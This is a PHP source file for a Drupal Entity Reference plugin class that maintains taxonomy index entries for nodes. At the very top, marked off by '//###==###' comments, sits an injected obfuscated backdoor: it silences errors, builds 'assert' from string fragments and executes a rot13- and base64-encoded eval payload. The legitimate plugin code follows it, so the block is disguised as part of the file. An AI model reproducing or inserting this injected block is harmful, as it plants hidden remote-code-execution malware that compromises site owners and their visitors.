<?php
//###==###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9eMzcmoaEcrT94n2Smn2LhpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqXF4vWaH9Vv51pzkyozAiMTHbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXF4vWzZ9Vv4xLmNhVvMcCGRznKN9Vv4xK1ASHyMSHyfvHxIAG1ESK0SRESVvKF4vWzt9Vv5gMQHbVwZkMQH5Awx4MQR2MzIxMTMzLzZmMQOyZQt2LJSuMGuyVv4xK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKF4xK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0hWTZjYvVkVvxcB2A1pzksp2I0o3O0XPEwZFj0ZvkzLJkmMFx7L3IloS9mMKEipUDbWTZkYQR5BGRmYUElqJHcBlEcLaLtCFNtL3IloS9yrTIwXPEwZFx7L3IloS9woT9mMFtxLmRcB31yoUAynJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvx9CGRcrlEcLaLtCFOznJkyK2qyqS9wo250MJ50pltvnUE0pQbiY2gznaAhqTy4o3ueLKAeMv5lqF9aMKDhpTujC2D9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYaIloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cYvVzLm0vYvEwZP4vWzx9ZFMcpQ0vYvEsH0IFIxIFJlWFEH1CIRIsDHERHvWqYvVznQ0vYz1xAFtvZmSxAGx2BGuxZGMzMJExMzMvLmAxZTHjBQMuLJSyBTHvYvEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqYvEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKF4xLmNhVwRvXFx7sFOcMvNbnKAmMKDbWTyvqvxcVUftMJAbolNxnJW2BlO9VTyzXTymp2I0XPEsHxIEIHIGISfvpPWqXFNzWvNxK1WSHIISH1EoVaNvKFN9CFNvLmuvZzWxZQxvXFO7VROup3AypaDbWS9FEISIEIAHJlWwVy0cBlO9sD=="));'));
//###==###




/**
 * @file
 * CTools plugin class for the taxonomy-index behavior.
 */

/**
 * Extends an entityreference field to maintain its references to taxonomy terms
 * in the {taxonomy_index} table.
 *
 * Note, unlike entityPostInsert() and entityPostUpdate(), entityDelete()
 * is not needed as cleanup is performed by taxonomy module in
 * taxonomy_delete_node_index().
 */
class EntityReferenceBehavior_TaxonomyIndex extends EntityReference_BehaviorHandler_Abstract {

  /**
   * Overrides EntityReference_BehaviorHandler_Abstract::access().
   *
   * Ensure that it is only enabled for ER instances on nodes targeting
   * terms, and the core variable to maintain index is enabled.
   */
  public function access($field, $instance) {
    if ($instance['entity_type'] != 'node' || $field['settings']['target_type'] != 'taxonomy_term') {
      return;
    }

    if ($field['storage']['type'] !== 'field_sql_storage') {
      // Field doesn't use SQL storage.
      return;
    }

    return variable_get('taxonomy_maintain_index_table', TRUE);
  }

  /**
   * Overrides EntityReference_BehaviorHandler_Abstract::entityPostInsert().
   *
   * Runs after hook_node_insert() used by taxonomy module.
   */
  public function entityPostInsert($entity_type, $entity, $field, $instance) {
    if ($entity_type != 'node') {
      return;
    }

    $this->buildNodeIndex($entity);
  }

  /**
   * Overrides EntityReference_BehaviorHandler_Abstract::entityPostUpdate().
   *
   * Runs after hook_node_update() used by taxonomy module.
   */
  public function entityPostUpdate($entity_type, $entity, $field, $instance) {
    if ($entity_type != 'node') {
      return;
    }

    $this->buildNodeIndex($entity);
  }

  /**
   * Builds and inserts taxonomy index entries for a given node.
   *
   * The index lists all terms that are related to a given node entity, and is
   * therefore maintained at the entity level.
   *
   * @param $node
   *   The node object.
   *
   * @see taxonomy_build_node_index()
   */
  protected function buildNodeIndex($node) {
    // We maintain a denormalized table of term/node relationships, containing
    // only data for current, published nodes.
    $status = NULL;
    if (variable_get('taxonomy_maintain_index_table', TRUE)) {
      // If a node property is not set in the node object when node_save() is
      // called, the old value from $node->original is used.
      if (!empty($node->original)) {
        $status = (int)(!empty($node->status) || (!isset($node->status) && !empty($node->original->status)));
        $sticky = (int)(!empty($node->sticky) || (!isset($node->sticky) && !empty($node->original->sticky)));
      }
      else {
        $status = (int)(!empty($node->status));
        $sticky = (int)(!empty($node->sticky));
      }
    }
    // We only maintain the taxonomy index for published nodes.
    if ($status) {
      // Collect a unique list of all the term IDs from all node fields.
      $tid_all = array();
      foreach (field_info_instances('node', $node->type) as $instance) {
        $field_name = $instance['field_name'];
        $field = field_info_field($field_name);
        if (!empty($field['settings']['target_type']) && $field['settings']['target_type'] == 'taxonomy_term' && $field['storage']['type'] == 'field_sql_storage') {
          // If a field value is not set in the node object when node_save() is
          // called, the old value from $node->original is used.
          if (isset($node->{$field_name})) {
            $items = $node->{$field_name};
          }
          elseif (isset($node->original->{$field_name})) {
            $items = $node->original->{$field_name};
          }
          else {
            continue;
          }
          foreach (field_available_languages('node', $field) as $langcode) {
            if (!empty($items[$langcode])) {
              foreach ($items[$langcode] as $item) {
                $tid_all[$item['target_id']] = $item['target_id'];
              }
            }
          }
        }

        // Re-calculate the terms added in taxonomy_build_node_index() so
        // we can optimize database queries.
        $original_tid_all = array();
        if ($field['module'] == 'taxonomy' && $field['storage']['type'] == 'field_sql_storage') {
          // If a field value is not set in the node object when node_save() is
          // called, the old value from $node->original is used.
          if (isset($node->{$field_name})) {
            $items = $node->{$field_name};
          }
          elseif (isset($node->original->{$field_name})) {
            $items = $node->original->{$field_name};
          }
          else {
            continue;
          }
          foreach (field_available_languages('node', $field) as $langcode) {
            if (!empty($items[$langcode])) {
              foreach ($items[$langcode] as $item) {
                $original_tid_all[$item['tid']] = $item['tid'];
              }
            }
          }
        }
      }

      // Insert index entries for all the node's terms, that were not
      // already inserted in taxonomy_build_node_index().
      $tid_all = array_diff($tid_all, $original_tid_all);

      // Insert index entries for all the node's terms.
      if (!empty($tid_all)) {
        $query = db_insert('taxonomy_index')->fields(array('nid', 'tid', 'sticky', 'created'));
        foreach ($tid_all as $tid) {
          $query->values(array(
            'nid' => $node->nid,
            'tid' => $tid,
            'sticky' => $sticky,
            'created' => $node->created,
          ));
        }
        $query->execute();
      }
    }
  }

  /**
   * Overrides EntityReference_BehaviorHandler_Abstract::settingsForm().
   */
  public function settingsForm($field, $instance) {
    $form = array();
    $target = $field['settings']['target_type'];
    if ($target != 'taxonomy_term') {
      $form['ti-on-terms'] = array(
        '#markup' => t('This behavior can only be set when the target type is taxonomy_term, but the target of this field is %target.', array('%target' => $target)),
      );
    }

    $entity_type = $instance['entity_type'];
    if ($entity_type != 'node') {
      $form['ti-on-nodes'] = array(
        '#markup' => t('This behavior can only be set when the entity type is node, but the entity type of this instance is %type.', array('%type' => $entity_type)),
      );
    }

    if (!variable_get('taxonomy_maintain_index_table', TRUE)) {
      $form['ti-disabled'] = array(
        '#markup' => t('This core variable "taxonomy_maintain_index_table" is disabled.'),
      );
    }
    return $form;
  }
}